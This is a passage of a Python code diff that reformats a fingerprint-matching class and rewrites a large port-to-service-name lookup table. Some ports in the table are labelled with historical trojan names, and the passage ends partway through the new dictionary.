             j = u = self.ctrie[u].child[ids]
             while j and self.ctrie[j].exist:
                 for k in self.ctrie[j].exist:
-                    res.append(strs[i - k  + 1: i + 1])
+                    res.append(strs[i - k + 1 : i + 1])
                 j = self.ctrie[j].fail
 
         return self.Chinese_identification(res)
-
 
     def identification(self, key):
         if len(key) > 1:
@@ -5455,7 +5718,7 @@ class Fingerident:
             key_name = None
         else:
             key_name = self.fin[key[0]]
-            
+
         return key_name
 
     def Chinese_identification(self, key):
@@ -5471,85 +5734,18 @@ class Fingerident:
             key_name = None
         else:
             key_name = self.cfin[key[0]]
-            
+
         return key_name
 
 
-
-
-
-
 def service(port):
-    service_list = {1:"tcpmux", 2:"compressnet", 3:"compressnet", 4:"sfs", 5:"rje", 7:"echo", 8:"trojan - Ping Attack",
-9:"discard", 11:"systat", 13:"daytime", 15:"netstat / trojan[B2]", 17:"quotd", 18:"msp", 19:"chargen",
-20:"ftp-data", 21:"ftp", 22:"ssh", 23:"telnet", 24:"priv-mail / trojan[BO2K]", 25:"smtp", 26:"rsftp", 27:"nsw-fe",
-28:"trojan[amanda]", 29:"msg-icp", 30:"trojan[Agent 40421]", 40421:"trojan[Agent 40421]", 31:"msg-auth",
-33:"dsp[Display Support Protocol]", 34:"remote[Remote File]", 35:"priv-printer", 37:"time", 38:"rap[Resource Location Protocol]",
-41:"graphics", 42:"nameserver", 43:"whois", 44:"mpm-flags", 45:"mpm", 46:"mpm-snd", 47:"ni-ftp", 48:"auditd",
-49:"bbn-login", 50:"re-mail.ck", 51:"la-maint", 52:"xns-time", 53:"domain", 54:"xns-ch", 55:"isi-gl",
-56:"xns-auth", 57:"priv-terminal / MTP", 58:"xns-mail", 59:"priv-file / Backdoor.Sdbot.AJ", 61:"NI MAIL", 62:"ACA Services",
-63:"whois++", 64:"covia", 65:"tacacs-ds", 66:"Oracle Sql *NET", 67:"bootps", 68:"bootpc", 69:"tftp", 70:"gopher",
-71:"netrjs-1", 72:"netrjs-2",  73:"netrjs-3", 74:"netrjs-4", 75:"priv-dial", 76:"deos", 77:"priv-RJE", 78:"vettcp",
-79:"finger", 80:"http", 81:"hosts2-ns", 82:"xfer", 83:"mit-ml-dev", 84:"Common Trace Facility", 85:"mit-ml-dev",
-86:"mfcobol", 87:"priv-terminal link", 88:"kerberos", 89:"su-mit-tg", 90:"dnsix", 91:"mit-dov", 92:"Network printing protocol",
-93:"device control protocol", 94:"objcall", 95:"supdup", 96:"dixie", 97:"swift-rvf", 98:"tacnews", 99:"metagram",
-100:"newacct", 101:"hostname", 102:"iso-tsap",  103:"gppitnp", 104:"acr-nema", 105:"csnet-ns", 106:"3com-tsmux",
-107:"rtelnet", 108:"SNA gateway",  109:"pop2", 110:"pop3", 111:"sunrpc", 112:"mcidas", 113:"auth", 114:"audionews",
-115:"sftp", 116:"ansanotify", 117:"uucp-path", 118:"sqlserv", 119:"nntp", 120:"cfdptkt", 121:"erpc", 122:"smakynet",
-123:"ntp", 124:"ansatrader", 125:"locus-map", 126:"unitary", 127:"locus-con", 128:"gss-xlicen", 129:"pwdgen",
-130:"cisco-fna", 131:"cisco-tna", 132:"cisco-sys", 133:"statsrv", 134:"ingres-net", 135:"loc-srv", 136:"profile",
-137:"netbios-ns", 138:"netbios-dgm", 139:"netbios-ssn",  140:"emfis-data", 141:"emfis-cntl", 142:"bl-idm", 143:"imap2",
-144:"news", 145:"uaac", 146:"iso-tp0", 147:"iso-ip", 148:"cronus", 149:"aed-512", 150:"SQL-NET", 151:"hems",
-152:"bftp", 153:"sgmp", 154:"netsc-prod", 155:"netsc-dev", 156:"SQL servic", 157:"knet-cmp", 158:"pcmail-srv", 159:"nss-routing",
-160:"sgmp-traps", 161:"snmp", 162:"snmptrap", 163:"cmip-man", 164:"cmip-agent", 165:"xns-courier", 166:"s-net",
-167:"namp", 168:"rsvd", 169:"send", 171:"multiplex", 170:"print-srv", 172:"cl/1", 173:"xyplex-mux", 174:"mailq",
-175:"vmnet",  176:"genrad-mux", 177:"xdmcp", 178:"nextstep", 179:"bgp", 180:"ris", 181:"unify", 182:"audit SITP",
-183:"ocbinder", 184:"ocserver", 185:"remote-kis", 186:"KIS protocol", 187:"ACI", 188:"mumps", 189:"qft",
-190:"gacp", 191:"prospero", 192:"osu-nms", 193:"srmp", 194:"irc", 195:"dn6-nlm-aud", 196:"dn6-smm-red", 197:"dls",
-198:"dls-mon", 199:"smux", 200:"src", 201:"at-rtmp", 202:"at-nbp", 203:"at-3", 204:"at-echo", 205:"at-5",
-206:"at-zis", 207:"at-7", 208:"at-8", 209:"tam", 210:"z39.50", 211:"914c/g", 212:"anet", 213:"ipx", 214:"vmpwscs",
-215:"softpc", 216:"atls", 217:"dbase", 218:"mpp", 219:"uarps", 220:"imap3", 221:"fln-spx",222:"rsh-spx",
-223:"cdc", 243:"sur-meas", 245:"link", 246:"dsp3270", 344:"pdap", 345:"pawserv", 346:"zserv", 347:"fatserv",
-348:"cis-sgwp", 371:"clearcase", 372:"ulistserv", 373:"legent-1", 374:"legent-2", 375:"hassle", 376:"nip",
-377:"tnETOS", 378:"dsETOS", 379:"is99c", 380:"is99s",381:"hp-collector", 382:"hp-managed-node",383:"hp-alarm-mgr",
-384:"arns", 385:"ibm-app", 386:"asa", 387:"aurp", 388:"unidata-ldm", 389:"ldap", 390:"uis", 391:"synotics-relay",
-392:"synotics-broker", 393:"dis", 394:"embl-ndt", 395:"netcp", 396:"netware-ip", 397:"mptn", 398:"kryptolan",
-399:"iso-tsap-c2", 400:"work-sol", 401:"ups", 402:"genie", 403:"decap", 404:"nced", 405:"ncld", 406:"imsp",
-407:"timbuktu", 408:"prm-sm", 409:"prm-nm", 410:"decladebug", 411:"rmt", 412:"synoptics-trap", 413:"smsp",
-414:"infoseek", 415:"bnet", 416:"silverplatter", 417:"onmux", 418:"hyper-g", 419:"ariel1", 420:"smpte",
-421:"ariel2", 422:"ariel3", 423:"opc-job-start", 424:"opc-job-track", 425:"icad-el", 426:"smartsdp",
-427:"svrloc", 428:"ocs_cmu", 429:"ocs_amu", 430:"utmpsd", 431:"utmpcd", 432:"iasd", 433:"nnsp",
-434:"mobileip-agent", 435:"mobilip-mn", 436:"dna-cml", 437:"dna-cml", 438:"dsfgw", 439:"dasp", 440:"sgcp",
-441:"decvms-sysmgt", 442:"cvc_hostd", 443:"https", 444:"snpp", 445:"microsoft-ds", 446:"ddm-rdb", 447:"ddm-dfm",
-448:"ddm-byte", 449:"as-servermap",  450:"tserver", 451:"sfs-smp-net", 452:"sfs-config", 453:"creativeserver",
-454:"contentserver", 455:"creativepartnr", 456:"macon-tcp", 457:"scohelp", 458:"appleqtc", 460:"skronk",
-459:"ampr-rcmd", 461:"datasurfsrv", 462:"datasurfsrvsec", 463:"alpes", 464:"kpasswd", 465:"ssmtp", 466:"digital-vrc",
-467:"mylex-mapd", 468:"photuris", 469:"rcp", 470:"scx-proxy", 471:"mondex", 472:"ljk-login", 473:"hybrid-pop",
-474:"tn-tl-w1", 475:"tcpnethaspsrv", 512:"exec", 513:"login", 514:"cmd", 515:"printer", 517:"talk", 518:"ntalk",
-519:"utime", 520:"efs", 525:"timed", 530:"courier", 531:"conference", 532:"netnews", 533:"netwall", 539:"apertus-ldp",
-540:"uucp", 541:"uucp-rlogin", 543:"klogin", 544:"kshell", 545:"appleqtcsrvr", 546:"dhcp-client", 547:"dhcp-server",
-550:"new-rwho", 551:"cybercash", 552:"deviceshare", 553:"pirp", 555:"dsf", 556:"remotefs", 557:"openvms-sysipc",
-558:"sdnskmp", 559:"teedtap", 560:"rmonitor", 561:"monitor", 562:"chshell", 563:"snews", 564:"9pfs", 565:"whoami",
-566:"streettalk", 567:"banyan-rpc", 568:"ms-shuttle", 569:"ms-rome", 570:"meter[demon]", 571:"meter[udemon]",
-572:"sonar", 573:"banyan-vip", 600:"ipcserver", 607:"nqs", 606:"urm", 608:"shift-uft", 609:"npmp-trap",
-610:"npmp-local", 611:"npmp-gui", 634:"ginad", 666:"mdqs / doom", 704:"elcsd", 709:"entrustmanager",
-729:"netviewdm1", 730:"netviewdm2", 731:"netviewdm3", 741:"netgw", 742:"netrcs", 744:"flexlm", 747:"fujitsu-dev",
-748:"ris-cm", 749:"kerberos-adm", 750:"rfile", 751:"pump", 752:"qrh", 753:"rrh", 754:"tell", 758:"nlogin",
-759:"con", 760:"ns", 761:"rxe", 762:"quotad", 763:"cycleserv", 764:"omserv", 765:"webster", 767:"phonebook",
-769:"vid", 770:"cadlock", 771:"rtip", 772:"cycleserv2", 773:"submit", 774:"rpasswd", 775:"entomb",
-776:"wpages", 780:"wpgs", 786:"concert", 800:"mdbs_daemon", 801:"device", 888:"accessbuilder", 996:"vsinet",
-997:"maitrd", 998:"busboy", 999:"garcon / puprouter", 1000:"cadlock",500:"isakmp",501:"stmf",502:"asa-appl-proto",503:"intrinsa",504:"citadel",505:"mailbox-lm",506:"ohimsrv",507:"crs",508:"xvttp",509:"snare",510:"fcp",511:"passgo",514:"shell",515:"printer",516:"videotex",517:"talk",518:"ntalk",519:"utime",520:"efs",521:"ripng",522:"ulp",523:"ibm-db2",524:"ncp",526:"tempo",527:"stx",528:"custix",529:"irc-serv",530:"courier",531:"conference",532:"netnews",533:"netwall",534:"mm-admin",535:"iiop",536:"opalis-rdv",537:"nmsp",538:"gdomap",539:"apertus-ldp",540:"uucp",541:"uucp-rlogin",542:"commerce",543:"klogin",544:"kshell",545:"ekshell",546:"dhcpv6-client",547:"dhcpv6-server",548:"afpovertcp",548:"afpovertcp",549:"idfp",550:"new-rwho",551:"cybercash",552:"deviceshare",553:"pirp",554:"rtsp",555:"dsf",556:"remotefs",557:"openvms-sysipc",558:"sdnskmp",559:"teedtap",560:"rmonitor",561:"monitor",562:"chshell",563:"snews",564:"9pfs",565:"whoami",566:"streettalk",567:"banyan-rpc",568:"ms-shuttle",570:"meter",571:"umeter",572:"sonar",573:"banyan-vip",574:"ftp-agent",575:"vemmi",576:"ipcd",577:"vnas",578:"ipdd",579:"decbsrv",580:"sntp-heartbeat",581:"bdp",582:"scc-security",583:"philips-vc",584:"keyserver",585:"imap4-ssl",586:"password-chg",587:"submission",588:"cal",589:"eyelink",590:"tns-cml",591:"http-alt",592:"eudora-set",593:"http-rpc-epmap",594:"tpip",595:"cab-protocol",596:"smsd",597:"ptcnameservice",598:"sco-websrvrmg3",599:"acp",600:"ipcserver",603:"mnotes",606:"urm",607:"nqs",608:"sift-uft",609:"npmp-trap",610:"npmp-local",611:"npmp-gui",617:"sco-dtmgr",628:"qmqp",631:"ipp",634:"ginad",636:"ldapssl",637:"lanserver",660:"mac-srvr-admin",666:"doom",674:"acap",691:"resvc",
-704:"elcsd",706:"silc",709:"entrustmanager",709:"entrustmanager",723:"omfs",729:"netviewdm1",730:"netviewdm2",730:"netviewdm2",731:"netviewdm3",731:"netviewdm3",740:"netcp",740:"netcp",741:"netgw",748:"ris-cm",781:"hp-collector",782:"hp-managed-node",783:"spamassassin",808:"ccproxy-http",871:"supfilesrv",873:"rsync",898:"sun-manageconsole",989:"ftps-data",901:"samba-swat",902:"iss-realsecure-sensor",903:"iss-console-mgr",950:"oftep-rpc",953:"rndc",975:"securenetpro-sensor",990:"ftps",992:"telnets",993:"imaps",994:"ircs",995:"pop3s",1002:"windows-icfw",1008:"ufsd",1023:"netvenuechat",1024:"kdm",1025:"NFS-or-IIS",1026:"LSA-or-nterm",1027:"IIS",1029:"ms-lsa",1030:"iad1",1031:"iad2",1032:"iad3",1033:"netinfo",1040:"netsaint",1043:"boinc-client",1050:"java-or-OTGfileshare",1058:"nim",1059:"nimreg",1067:"instl_boots",1068:"instl_bootc",1076:"sns_credit",1080:"socks",1083:"ansoft-lm-1",1084:"ansoft-lm-2",1103:"xaudio",1109:"kpop",1110:"nfsd-status",1112:"msql",1127:"supfiledbg",1139:"cce3x",1155:"nfa",1158:"lsnr",1178:"skkserv",1212:"lupa",1214:"fasttrack",1220:"quicktime",1222:"nerv",1234:"hotline",1241:"nessus",1248:"hermes",1337:"waste",1346:"alta-ana-lm",1347:"bbn-mmc",1348:"bbn-mmx",1349:"sbook",1350:"editbench",1351:"equationbuilder",1352:"lotusnotes",1353:"relief",1354:"rightbrain",1355:"intuitive-edge",
-1356:"cuillamartin",1357:"pegboard",1358:"connlcli",1359:"ftsrv",1360:"mimer",1361:"linx",1362:"timeflies",1363:"ndm-requester",1364:"ndm-server",1365:"adapt-sna",1366:"netware-csp",1367:"dcs",1368:"screencast",1369:"gv-us",1370:"us-gv",1371:"fc-cli",1372:"fc-ser",1373:"chromagrafx",1374:"molly",1375:"bytex",1376:"ibm-pps",1377:"cichlid",1378:"elan",1379:"dbreporter",1380:"telesis-licman",1381:"apple-licman",1383:"gwha",1384:"os-licman",1385:"atex_elmd",1386:"checksum",1387:"cadsi-lm",1388:"objective-dbc",1389:"iclpv-dm",1390:"iclpv-sc",1391:"iclpv-sas",1392:"iclpv-pm",1393:"iclpv-nls",1394:"iclpv-nlc",1395:"iclpv-wsm",1396:"dvl-activemail",1397:"audio-activmail",1398:"video-activmail",1399:"cadkey-licman",1400:"cadkey-tablet",1401:"goldleaf-licman",1402:"prm-sm-np",1403:"prm-nm-np",1404:"igi-lm",1405:"ibm-res",1406:"netlabs-lm",1407:"dbsa-lm",1408:"sophia-lm",1409:"here-lm",1410:"hiq",1411:"af",1412:"innosys",1413:"innosys-acl",1414:"ibm-mqseries",1415:"dbstar",1416:"novell-lu6.2",1417:"timbuktu-srv1",1418:"timbuktu-srv2",1419:"timbuktu-srv3",1420:"timbuktu-srv4",1421:"gandalf-lm",1422:"autodesk-lm",1423:"essbase",1424:"hybrid",1425:"zion-lm",1426:"sas-1",1427:"mloadd",1428:"informatik-lm",1429:"nms",1430:"tpdu",1431:"rgtp",1432:"blueberry-lm",1433:"ms-sql-s",1434:"ms-sql-m",1435:"ibm-cics",1436:"sas-2",1437:"tabula",1438:"eicon-server",1439:"eicon-x25",1440:"eicon-slp",1441:"cadis-1",1442:"cadis-2",1443:"ies-lm",1444:"marcam-lm",1445:"proxima-lm",1446:"ora-lm",1447:"apri-lm",1448:"oc-lm",1449:"peport",1450:"dwf",1451:"infoman",1452:"gtegsc-lm",1453:"genie-lm",1454:"interhdl_elmd",1455:"esl-lm",1456:"dca",1457:"valisys-lm",1458:"nrcabq-lm",1459:"proshare1",1460:"proshare2",1461:"ibm_wrless_lan",1462:"world-lm",1463:"nucleus",1464:"msl_lmd",1465:"pipes",1466:"oceansoft-lm",1467:"csdmbase",1468:"csdm",1469:"aal-lm",
-1470:"uaiact",1471:"csdmbase",1472:"csdm",1473:"openmath",1474:"telefinder",1475:"taligent-lm",1476:"clvm-cfg",1477:"ms-sna-server",1478:"ms-sna-base",1479:"dberegister",1480:"pacerforum",1481:"airs",1482:"miteksys-lm",1483:"afs",1484:"confluent",1485:"lansource",1486:"nms_topo_serv",1487:"localinfosrvr",1488:"docstor",1489:"dmdocbroker",1490:"insitu-conf",1491:"anynetgateway",1492:"stone-design-1",1493:"netmap_lm",1494:"citrix-ica",1495:"cvc",1496:"liberty-lm",1497:"rfx-lm",1498:"watcom-sql",1499:"fhc",1500:"vlsi-lm",1501:"sas-3",1502:"shivadiscovery",1503:"imtc-mcs",1504:"evb-elm",1505:"funkproxy",1506:"utcd",1507:"symplex",1508:"diagmond",1509:"robcad-lm",1510:"mvx-lm",1511:"3l-l1",1512:"wins",1513:"fujitsu-dtc",1514:"fujitsu-dtcns",1515:"ifor-protocol",1516:"vpad",1517:"vpac",1518:"vpvd",1519:"vpvc",1520:"atm-zip-office",1521:"oracle",1522:"rna-lm",1523:"cichild-lm",1524:"ingreslock",1525:"orasrv",1526:"pdap-np",1527:"tlisrv",1528:"mciautoreg",1529:"support",1530:"rap-service",1531:"rap-listen",1532:"miroconnect",1533:"virtual-places",1534:"micromuse-lm",1535:"ampr-info",1536:"ampr-inter",1537:"sdsc-lm",1538:"3ds-lm",1539:"intellistor-lm",1540:"rds",1541:"rds2",1542:"gridgen-elmd",1543:"simba-cs",1544:"aspeclmd",1545:"vistium-share",1546:"abbaccuray",1547:"laplink",1548:"axon-lm",1549:"shivahose",1550:"3m-image-lm",1551:"hecmtl-db",1552:"pciarray",1600:"issd",1650:"nkd",1651:"shiva_confsrvr",1652:"xnmp",1661:"netview-aix-1",1662:"netview-aix-2",1663:"netview-aix-3",1664:"netview-aix-4",1665:"netview-aix-5",1666:"netview-aix-6",1667:"netview-aix-7",1668:"netview-aix-8",1669:"netview-aix-9",1670:"netview-aix-10",1671:"netview-aix-11",1672:"netview-aix-12",1680:"CarbonCopy",1720:"H.323/Q.931",1723:"pptp",1755:"wms",1761:"landesk-rc",1762:"landesk-rc",1763:"landesk-rc",1764:"landesk-rc",1827:"pcm",1900:"UPnP",1935:"rtmp",
-1984:"bigbrother",1986:"licensedaemon",1987:"tr-rsrb-p1",1988:"tr-rsrb-p2",1989:"tr-rsrb-p3",1990:"stun-p1",1991:"stun-p2",1992:"stun-p3",1993:"snmp-tcp-port",1993:"snmp-tcp-port",1994:"stun-port",1995:"perf-port",1996:"tr-rsrb-port",1997:"gdp-port",1998:"x25-svc-port",1999:"tcp-id-port",1999:"tcp-id-port",2000:"callbook",2001:"dc",2002:"globe",2003:"cfingerd",2004:"mailbox",2005:"deslogin",2006:"invokator",2007:"dectalk",2008:"conf",2009:"news",2010:"search",2011:"raid-cc",2012:"ttyinfo",2013:"raid-am",2014:"troff",2015:"cypress",2016:"bootserver",2017:"cypress-stat",2018:"terminaldb",2019:"whosockami",2020:"xinupageserver",2021:"servexec",2022:"down",2023:"xinuexpansion3",2024:"xinuexpansion4",2025:"ellpack",2026:"scrabble",2027:"shadowserver",2028:"submitserver",2030:"device2",2032:"blackboard",2033:"glogger",2034:"scoremgr",2035:"imsldoc",2038:"objectmanager",2040:"lam",2041:"interbase",2042:"isis",2043:"isis-bcast",2044:"rimsl",2045:"cdfunc",2046:"sdfunc",2047:"dls",2048:"dls-monitor",2049:"nfs",2064:"dnet-keyproxy",2053:"knetd",2065:"dlsrpn",2067:"dlswpn",2068:"advocentkvm",2105:"eklogin",2106:"ekshell",2108:"rkinit",2111:"kx",2112:"kip",2120:"kauth",2121:"ccproxy-ftp",2201:"ats",2232:"ivs-video",2241:"ivsd",2301:"compaqdiag",2307:"pehelp",2401:"cvspserver",2430:"venus",2431:"venus-se",2432:"codasrv",2433:"codasrv-se",2500:"rtsserv",2501:"rtsclient",2564:"hp-3000-telnet",2600:"zebrasrv",2601:"zebra",2602:"ripd",2603:"ripngd",2604:"ospfd",2605:"bgpd",2627:"webster",2628:"dict",2638:"sybase",2766:"listen",2784:"www-dev",2809:"corbaloc",2903:"extensisportfolio",2998:"iss-realsec",3000:"ppp",3001:"nessusd",3005:"deslogin",3006:"deslogind",3049:"cfs",3052:"PowerChute",3064:"dnet-tstproxy",3086:"sj3",3128:"squid-http",3141:"vmodem",3264:"ccmail",3268:"globalcatLDAP",
-3269:"globalcatLDAPssl",3292:"meetingmaker",3306:"mysql",3333:"dec-notes",3372:"msdtc",3389:"ms-term-serv",3421:"bmap",3455:"prsvp",3456:"vat",3457:"vat-control",3462:"track",3531:"peerenabler",3632:"distccd",3689:"rendezvous",3900:"udt_os",3984:"mapper-nodemgr",3985:"mapper-mapethd",3986:"mapper-ws_ethd",3999:"remoteanything",4000:"remoteanything",4008:"netcheque",4045:"lockd",4125:"rww",4132:"nuts_dem",4133:"nuts_bootp",4144:"wincim",4224:"xtell",4321:"rwhois",4333:"msql",4343:"unicall",4444:"krb524",4480:"proxy-plus",4500:"sae-urn",4557:"fax",4559:"hylafax",4660:"mosmig",4672:"rfa",4827:"squid-htcp",4899:"radmin",4987:"maybeveritas",4998:"maybeveritas",5000:"UPnP",5001:"commplex-link",5002:"rfe",5003:"filemaker",5010:"telelpathstart",5011:"telelpathattack",5050:"mmcc",5100:"admd",5101:"admdog",5102:"admeng",5145:"rmonitor_secure",5060:"sip",5190:"aol",5191:"aol-1",5192:"aol-2",5193:"aol-3",5232:"sgi-dgl",5236:"padl2sim",5300:"hacl-hb",5301:"hacl-gs",5302:"hacl-cfg",5303:"hacl-probe",5304:"hacl-local",5305:"hacl-test",5308:"cfengine",5400:"pcduo-old",5405:"pcduo",5490:"connect-proxy",5432:"postgres",5510:"secureidprop",5520:"sdlog",5530:"sdserv",5540:"sdreport",5550:"sdadmind",5555:"freeciv",5560:"isqlplus",5631:"pcanywheredata",5632:"pcanywherestat",5680:"canna",5679:"activesync",5713:"proshareaudio",5714:"prosharevideo",5715:"prosharedata",5716:"prosharerequest",5717:"prosharenotify",5800:"vnc-http",5801:"vnc-http-1",5802:"vnc-http-2",5803:"vnc-http-3",5900:"vnc",5901:"vnc-1",5902:"vnc-2",5903:"vnc-3",5977:"ncd-pref-tcp",5978:"ncd-diag-tcp",5979:"ncd-conf-tcp",5997:"ncd-pref",5998:"ncd-diag",5999:"ncd-conf",
-6000:"X11",6001:"X11:1",6002:"X11:2",6003:"X11:3",6004:"X11:4",6005:"X11:5",6006:"X11:6",6007:"X11:7",6008:"X11:8",6009:"X11:9",6017:"xmail-ctrl",6050:"arcserve",6101:"VeritasBackupExec",6103:"RETS-or-BackupExec",6105:"isdninfo",6106:"isdninfo",6110:"softcm",6111:"spc",6112:"dtspc",6141:"meta-corp",6142:"aspentec-lm",6143:"watershed-lm",6144:"statsci1-lm",6145:"statsci2-lm",6146:"lonewolf-lm",6147:"montage-lm",6148:"ricardo-lm",6346:"gnutella",6400:"crystalreports",6401:"crystalenterprise",6543:"mythtv",6544:"mythtv",6547:"PowerChutePLUS",6548:"PowerChutePLUS",6502:"netop-rc",6558:"xdsxdm",6588:"analogx",6666:"irc-serv",6667:"irc",6668:"irc",6969:"acmsoda",6699:"napster",7000:"afs3-fileserver",7001:"afs3-callback",7002:"afs3-prserver",7003:"afs3-vlserver",7004:"afs3-kaserver",7005:"afs3-volser",7006:"afs3-errors",7007:"afs3-bos",7008:"afs3-update",7009:"afs3-rmtsys",7010:"ups-onlinet",7070:"realserver",7100:"font-service",7200:"fodms",7201:"dlip",7273:"openmanage",7326:"icb",7464:"pythonds",7597:"qaz",7937:"nsrexecd",7938:"lgtomapper",8000:"http-alt",8007:"ajp12",8009:"ajp13",8021:"ftp-proxy",8080:"http-proxy",8081:"blackice-icecap",8082:"blackice-alerts",8443:"https-alt",8888:"sun-answerbook",8892:"seosload",9090:"zeus-admin",9100:"jetdirect",9111:"DragonIDSConsole",9152:"ms-sql2000",9535:"man",9876:"sd",9991:"issa",9992:"issc",9999:"abyss",10000:"snet-sensor-mgmt",10005:"stel",10082:"amandaidx",10083:"amidxtape",11371:"pksd",12000:"cce4x",12345:"NetBus",12346:"NetBus",13701:"VeritasNetbackup",13702:"VeritasNetbackup",13705:"VeritasNetbackup",13706:"VeritasNetbackup",13708:"VeritasNetbackup",13709:"VeritasNetbackup",13710:"VeritasNetbackup",13711:"VeritasNetbackup",13712:"VeritasNetbackup",13713:"VeritasNetbackup",13714:"VeritasNetbackup",13715:"VeritasNetbackup",13716:"VeritasNetbackup",13717:"VeritasNetbackup",
-13718:"VeritasNetbackup",13720:"VeritasNetbackup",13721:"VeritasNetbackup",13722:"VeritasNetbackup",13782:"VeritasNetbackup",13783:"VeritasNetbackup",15126:"swgps",16959:"subseven",17007:"isode-dua",17300:"kuang2",18000:"biimenu",18181:"opsec_cvp",18182:"opsec_ufp",18183:"opsec_sam",18184:"opsec_lea",18185:"opsec_omi",18187:"opsec_ela",19150:"gkrellmd",20005:"btx",22273:"wnn6",22289:"wnn6_Cn",22305:"wnn6_Kr",22321:"wnn6_Tw",22370:"hpnpd",26208:"wnn6_DS",27000:"flexlm0",27001:"flexlm1",27002:"flexlm2",27003:"flexlm3",27004:"flexlm4",27005:"flexlm5",27006:"flexlm6",27007:"flexlm7",27008:"flexlm8",27009:"flexlm9",27010:"flexlm10",27374:"subseven",27665:"Trinoo_Master",31337:"Elite",32770:"sometimes-rpc3",32771:"sometimes-rpc5",32772:"sometimes-rpc7",32773:"sometimes-rpc9",32774:"sometimes-rpc11",32775:"sometimes-rpc13",32776:"sometimes-rpc15",32777:"sometimes-rpc17",32778:"sometimes-rpc19",32779:"sometimes-rpc21",32780:"sometimes-rpc23",32786:"sometimes-rpc25",32787:"sometimes-rpc27",44334:"tinyfw",44442:"coldfusion-auth",44443:"coldfusion-auth",47557:"dbbrowse",49400:"compaqdiag",54320:"bo2k"}
+    service_list = {2048: 'dls-monitor', 1: 'tcpmux', 2: 'compressnet', 3: 'compressnet', 4: 'sfs', 5: 'rje', 32774: 'sometimes-rpc11', 7: 'echo', 8: 'trojan - Ping Attack', 9: 'discard', 32778: 'sometimes-rpc19', 11: 'systat', 6547: 'PowerChutePLUS', 13: 'daytime', 15: 'netstat / trojan[B2]', 2064: 'dnet-keyproxy', 17: 'quotd', 18: 'msp', 19: 'chargen', 20: 'ftp-data', 21: 'ftp', 22: 'ssh', 23: 'telnet', 24: 'priv-mail / trojan[BO2K]', 25: 'smtp', 26: 'rsftp', 27: 'nsw-fe', 28: 'trojan[amanda]', 29: 'msg-icp', 30: 'trojan[Agent 40421]', 31: 'msg-auth', 33: 'dsp[Display Support Protocol]', 34: 'remote[Remote File]', 35: 'priv-printer', 4132: 'nuts_dem', 37: 'time', 38: 'rap[Resource Location Protocol]', 41: 'graphics', 42: 'nameserver', 43: 'whois', 44: 'mpm-flags', 45: 'mpm', 46: 'mpm-snd', 47: 'ni-ftp', 48: 'auditd', 49: 'bbn-login', 50: 're-mail.ck', 51: 'la-maint', 52: 'xns-time', 53: 'domain', 54: 'xns-ch', 55: 'isi-gl', 56: 'xns-auth', 57: 'priv-terminal / MTP', 58: 'xns-mail', 59: 'priv-file / Backdoor.Sdbot.AJ', 2108: 'rkinit', 61: 'NI MAIL', 62: 'ACA Services', 63: 'whois++', 64: 'covia', 65: 'tacacs-ds', 66: 'Oracle Sql *NET', 67: 'bootps', 68: 'bootpc', 69: 'tftp', 70: 'gopher', 71: 'netrjs-1', 72: 'netrjs-2', 73: 'netrjs-3', 74: 'netrjs-4', 75: 'priv-dial', 76: 'deos', 77: 'priv-RJE', 78: 'vettcp', 79: 'finger', 80: 'http', 81: 'hosts2-ns', 82: 'xfer', 83: 'mit-ml-dev', 84: 'Common Trace Facility', 85: 'mit-ml-dev', 86: 'mfcobol', 87: 'priv-terminal link', 88: 'kerberos', 89: 'su-mit-tg', 90: 'dnsix', 91: 'mit-dov', 92: 'Network printing protocol', 93: 'device control protocol', 94: 'objcall', 95: 'supdup', 96: 'dixie', 97: 'swift-rvf', 98: 'tacnews', 99: 'metagram', 100: 'newacct', 101: 'hostname', 102: 'iso-tsap', 103: 'gppitnp', 104: 'acr-nema', 105: 'csnet-ns', 106: '3com-tsmux', 107: 'rtelnet', 108: 'SNA gateway', 109: 'pop2', 110: 'pop3', 111: 'sunrpc', 112: 'mcidas', 113: 'auth', 114: 'audionews', 115: 'sftp', 116: 'ansanotify', 117: 'uucp-path', 118: 'sqlserv', 119: 'nntp', 120: 'cfdptkt', 121: 'erpc', 122: 'smakynet', 123: 'ntp', 124: 'ansatrader', 125: 'locus-map', 126: 'unitary', 127: 'locus-con', 128: 'gss-xlicen', 129: 'pwdgen', 130: 'cisco-fna', 131: 'cisco-tna', 132: 'cisco-sys', 133: 'statsrv', 134: 'ingres-net', 135: 'loc-srv', 136: 'profile', 137: 'netbios-ns', 138: 'netbios-dgm', 139: 'netbios-ssn', 140: 'emfis-data', 141: 'emfis-cntl', 142: 'bl-idm', 143: 'imap2', 144: 'news', 145: 'uaac', 146: 'iso-tp0', 147: 'iso-ip', 148: 'cronus', 149: 'aed-512', 150: 'SQL-NET', 151: 'hems', 152: 'bftp', 153: 'sgmp', 154: 'netsc-prod', 155: 'netsc-dev', 156: 'SQL servic', 157: 'knet-cmp', 158: 'pcmail-srv', 159: 'nss-routing', 160: 'sgmp-traps', 161: 'snmp', 162: 'snmptrap', 163: 'cmip-man', 164: 'cmip-agent', 165: 'xns-courier', 166: 's-net', 167: 'namp', 168: 'rsvd', 169: 'send', 170: 'print-srv', 171: 'multiplex', 172: 'cl/1', 173: 'xyplex-mux', 174: 'mailq', 175: 'vmnet', 176: 'genrad-mux', 177: 'xdmcp', 178: 'nextstep', 179: 'bgp', 180: 'ris', 181: 'unify', 182: 'audit SITP', 183: 'ocbinder', 184: 'ocserver', 185: 'remote-kis', 186: 'KIS protocol', 187: 'ACI', 188: 'mumps', 189: 'qft', 190: 'gacp', 191: 'prospero', 192: 'osu-nms', 193: 'srmp', 194: 'irc', 195: 'dn6-nlm-aud', 196: 'dn6-smm-red', 197: 'dls', 198: 'dls-mon', 199: 'smux', 200: 'src', 201: 'at-rtmp', 202: 'at-nbp', 203: 'at-3', 204: 'at-echo', 205: 'at-5', 206: 'at-zis', 207: 'at-7', 208: 'at-8', 209: 'tam', 210: 'z39.50', 211: '914c/g', 212: 'anet', 213: 'ipx', 214: 'vmpwscs', 215: 'softpc', 216: 'atls', 217: 'dbase', 218: 'mpp', 219: 'uarps', 220: 'imap3', 221: 'fln-spx', 222: 'rsh-spx', 223: 'cdc', 4321: 'rwhois', 27003: 'flexlm3', 6145: 'statsci2-lm', 13721: 'VeritasNetbackup', 27004: 'flexlm4', 7100: 'font-service', 13715: 'VeritasNetbackup', 4333: 'msql', 27005: 'flexlm5', 243: 'sur-meas', 245: 'link', 246: 'dsp3270', 4343: 'unicall', 49400: 'compaqdiag', 2431: 'venus-se', 2301: 'compaqdiag', 6400: 'crystalreports', 2432: 'codasrv', 6146: 'lonewolf-lm', 2307: 'pehelp', 2433: 'codasrv-se', 13716: 'VeritasNetbackup', 27010: 'flexlm10', 12345: 'NetBus', 27007: 